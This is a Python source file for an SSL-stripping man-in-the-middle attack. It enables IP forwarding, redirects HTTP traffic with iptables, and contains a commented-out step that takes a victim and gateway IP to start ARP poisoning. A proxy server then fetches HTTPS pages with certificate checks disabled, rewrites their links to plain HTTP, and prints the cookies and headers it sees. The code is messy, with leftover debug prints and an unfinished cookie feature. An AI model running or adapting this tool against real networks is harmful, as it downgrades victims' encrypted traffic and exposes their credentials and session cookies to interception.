import os
from scapy.all import *
import time
import string
import requests
import cherrypy

print "                                                               "
print "              _           _        _             _             "
print "      ___ ___| |      ___| |_ _ __(_)_ __  _ __ (_)_ __   __ _ "
print "     / __/ __| |_____/ __| __| '__| | '_ \| '_ \| | '_ \ / _` |"
print "     \__ \__ \ |_____\__ \ |_| |  | | |_) | |_) | | | | | (_| |"
print "     |___/___/_|     |___/\__|_|  |_| .__/| .__/|_|_| |_|\__, |"
print "                                    |_|   |_|            |___/ "
print "                                                               "
print "                              Including secure cookie stripping"
print "                                                               "
print "                                                               "

print "Enabling IP forwarding"
file = open("/proc/sys/net/ipv4/ip_forward", "w")
file.write("1")
file.close()


print "redirecting all http traffic to port 8080"
os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
"""
vIP = raw_input("Victim IP address?")
gatewayIP = raw_input("Gateway IP address?")
file = open("vIP.txt", "w+")
file.write(vIP)
file.close
file = open("gatewayIP.txt", "w+")
file.write(gatewayIP)
file.close
os.system("gnome-terminal -e 'python arpPoison.py'")
"""

#Starting the stripping process

def stripHTTPS(url, request):

    # Response message for the victim
    response = requests.models.Response()
    print response.url
    print response.url
    print response.url

    # Set HTTPstatuscode to 200 OK
    response.status_code = 200

    # reponse message url is equal to provided url
    response.url = url
    
    print response.url
    print response.url

    request2 = request.text

    #print response.content
    
    # Replace HTTPS with HTTPS 

    newURL = request2.replace("HTTPS", "HTTP")
    newURL2 = newURL.replace("https", "http")

    newURL3 = newURL2.replace("//s.", "https://s.")
    newURL4 = newURL3.replace('href="//s', 'href="https:s')


    response._content = newURL4.encode('utf-8')

    response.headers = request.headers
    response.history = request.history    
    response.encoding = request.encoding
    response.reason = request.reason
    response.elapsed = request.elapsed
    response.request = request.request

    return response


    

class sslStripping(object):
    @cherrypy.expose
    def default(self, *route):

        url = cherrypy.url()
            
        print url

        if ".js" in url:
    	    print ".js"
     	    r = requests.get(url, verify=False)
    	    r.headers.update({'Access-Control-Allow-Origin' : '*'})
    	    print "testttttt"
    	    print r.headers
    	    return r.content
        elif ".css" in url:
    	    print ".css"
    	    r = requests.get(url, verify=False)
     	    r.headers.update({'Access-Control-Allow-Origin' : '*'})
    	    print "cssstestt"
    	    print r.headers
    	    return r.content
        elif ".woff2" in url:
            print ".woff2"
            r = requests.put(url)
            r.headers.update({'Access-Control-Allow-Origin' : '*'})
            print ".woffteset"
            print r.headers
            return r.content
        else:
            url = str(url).replace("http", "https")
        
        response = requests.get(url, verify=False)

        if(str(response.encoding) == "None"):
            return response.content

        print "Request made and returned status code: " +  str(response.status_code)
        print "Response encoding: " + str(response.encoding)

        print response.cookies
        print " ---------------------------------------------------------------------------" 
        print response.headers
        if(str(response.encoding) == "None"):
            return response.content

        response2 = stripHTTPS(url, response)

        #response3 = stripSecureCookie(response2)
        print response2
        return response2.content



if __name__ == '__main__':

    # This command binds cherrypy to all interfaces of this machine, hence it is findable on the network on port 8080
    cherrypy.config.update({'server.socket_host': '0.0.0.0'})
    # This command actually starts the server
    cherrypy.quickstart(sslStripping())
